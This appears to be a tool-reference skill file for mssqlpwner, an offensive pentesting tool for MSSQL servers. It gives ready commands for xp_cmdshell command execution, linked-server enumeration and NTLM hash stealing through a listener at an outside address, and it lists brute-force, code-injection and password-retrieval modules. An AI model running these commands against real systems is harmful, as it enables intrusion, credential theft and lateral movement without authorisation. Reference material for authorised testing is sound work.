---
name: mssqlpwner
description: Advanced MSSQL pentesting tool for interacting with and exploiting MSSQL servers. It supports authentication via clear-text, NTLM hashes, and Kerberos, and allows for command execution through xp_cmdshell, sp_oacreate, and custom assemblies. Use when performing MSSQL enumeration, lateral movement via linked servers, credential theft, or post-exploitation on Windows database environments.
---

# mssqlpwner

## Overview
MSSqlPwner is a versatile pentesting tool based on Impacket designed to interact with and exploit MSSQL servers. It excels at enumerating linked servers, performing impersonation attacks, and executing commands through multiple vectors. Category: Exploitation / Vulnerability Analysis.

## Installation (if not already installed)
Assume the tool is installed. If not, use:
```bash
sudo apt install mssqlpwner
```

## Common Workflows

### Interactive Enumeration and Exploitation
Start an interactive session to explore the database and linked servers:
```bash
mssqlpwner domain/user:password@10.10.10.50 interactive
```

### Command Execution via xp_cmdshell
Execute a system command on the target server:
```bash
mssqlpwner domain/user:password@10.10.10.50 exec -command "whoami"
```

### Linked Server Enumeration
Recursively discover linked servers and impersonation opportunities:
```bash
mssqlpwner domain/user:password@10.10.10.50 enumerate -max-link-depth 3
```

### NTLM Relay / Hash Stealing
Force the MSSQL server to authenticate back to a listener to capture NetNTLM hashes:
```bash
mssqlpwner domain/user:password@10.10.10.50 ntlm-relay -smb-server 10.10.14.5
```

## Complete Command Reference

### Usage
```bash
mssqlpwner [Options] target {module} [Module Options]
```

**Target Format:** `[[domain/]username[:password]@]<targetName or address>`

### General Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |
| `-port PORT` | Target MSSQL port (default: 1433) |
| `-timeout TIMEOUT` | Timeout in seconds (default: 30) |
| `-db DB` | MSSQL database instance (default: None) |
| `-windows-auth` | Use Windows Authentication (default: False) |
| `-no-state` | Do not load existing state |
| `-debug` | Turn DEBUG output ON |
| `-auto-yes` | Auto answer yes to all questions |

### Authentication Options
| Flag | Description |
|------|-------------|
| `-hashes LMHASH:NTHASH` | NTLM hashes, format is LMHASH:NTHASH |
| `-no-pass` | Don't ask for password (useful for Kerberos) |
| `-k` | Use Kerberos authentication (grabs from KRB5CCNAME) |
| `-aesKey hex key` | AES key for Kerberos Authentication (128 or 256 bits) |
| `-dc-ip ip address` | IP Address of the domain controller |

### Module Selection Options
| Flag | Description |
|------|-------------|
| `-link-name LINK_NAME` | Linked server to launch queries against |
| `-max-link-depth DEPTH` | Maximum links to depth recursively |
| `-max-impersonation-depth DEPTH` | Maximum impersonation depth in each link |
| `-chain-id CHAIN_ID` | Specific Chain ID to use |

### Modules
| Module | Description |
|--------|-------------|
| `enumerate` | Enumerate MSSQL server (links, users, permissions) |
| `set-chain` | Set chain ID (Interactive-mode only) |
| `rev2self` | Revert to SELF (Interactive-mode only) |
| `get-rev2self-queries` | Retrieve queries to revert to SELF (Interactive-mode only) |
| `get-chain-list` | Get list of discovered chains |
| `get-link-server-list` | Get list of linked servers |
| `get-adsi-provider-list` | Get ADSI provider list |
| `set-link-server` | Set link server (Interactive-mode only) |
| `exec` | Execute system commands |
| `ntlm-relay` | Steal NetNTLM hash / Trigger Relay attack |
| `custom-asm` | Execute procedures using custom assembly |
| `inject-custom-asm` | Code injection using custom assembly |
| `direct-query` | Execute direct SQL query |
| `retrieve-password` | Retrieve passwords from ADSI servers |
| `interactive` | Enter Interactive Mode |
| `brute` | Perform brute force attacks |

## Notes
- This tool is highly effective for "chaining" attacks across multiple linked MSSQL servers.
- When using `exec`, the tool will attempt to enable `xp_cmdshell` if it is disabled, provided the user has sufficient permissions.
- State is saved by default to allow resuming or referencing previous discovery; use `-no-state` to ignore.